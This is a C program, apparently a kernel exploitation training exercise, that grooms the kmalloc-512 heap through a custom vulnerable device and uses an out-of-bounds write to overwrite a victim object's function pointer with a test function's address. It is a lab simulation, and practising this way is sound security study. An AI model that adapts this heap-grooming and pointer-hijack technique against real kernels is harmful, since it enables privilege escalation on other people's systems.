#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include "heap_api.h"

static unsigned long get_bad_addr(void) {
    FILE *fp = popen("dmesg | grep 'bad func'", "r");
    if (!fp) return 0;
    char line[256];
    unsigned long addr = 0;
    while (fgets(line, sizeof(line), fp)) {
        char *p = strstr(line, "bad func: 0x");
        if (p) {
            sscanf(p, "bad func: 0x%lx", &addr);
        }
    }
    pclose(fp);
    return addr;
}

int main(void) {
    int fd = open("/dev/uv_oob_dev", O_RDWR);
    if (fd < 0) {
        printf("[-] Failed to open device\n");
        return -1;
    }

    int vulobj_idx;
    int victim_idx;

    printf("[*] Kernel OOB Exploit Simulation\n");

    unsigned long bad_func_addr = get_bad_addr();
    if (bad_func_addr == 0) {
        printf("[-] Failed to find bad_function address from dmesg.\n");
        printf("[-] Ensure the module is loaded and dmesg has the address.\n");
        close(fd);
        return -1;
    }
    printf("[+] Found bad_function address: 0x%lx\n", bad_func_addr);

    printf("[+] Defragmenting kmalloc-512...\n");
    if (heap_defrag(fd) < 0) {
        close(fd);
        return -1;
    }

    if (heap_alloc_vul(fd, 1, &vulobj_idx) < 0) {
        close(fd);
        return -1;
    }

    if (heap_alloc_victim(fd, 1, &victim_idx) < 0) {
        close(fd);
        return -1;
    }

    printf("[+] Dumping victim before overwrite...\n");
    heap_read_victim(fd, victim_idx);

    printf("[+] Executing original funptr...\n");
    if (heap_execute_victim(fd, victim_idx) < 0) {
        close(fd);
        return -1;
    }

    printf("[+] Overwriting funptr with bad_function address...\n");
    for (int i = 0; i < (int)sizeof(unsigned long); i++) {
        char b = (char)((bad_func_addr >> (i * 8)) & 0xFF);
        if (heap_write_vul(fd, vulobj_idx, 512 + i, b) < 0) {
            close(fd);
            return -1;
        }
    }
    printf("[+] Overwrite done.\n");

    printf("[+] Dumping victim after overwrite...\n");
    heap_read_victim(fd, victim_idx);

    printf("[+] Executing hijacked funptr...\n");
    if (heap_execute_victim(fd, victim_idx) < 0) {
        close(fd);
        return -1;
    }
    printf("[+] Execute command sent. Run 'dmesg | tail' to check if 'bad' was printed!\n");

    close(fd);
    return 0;
}
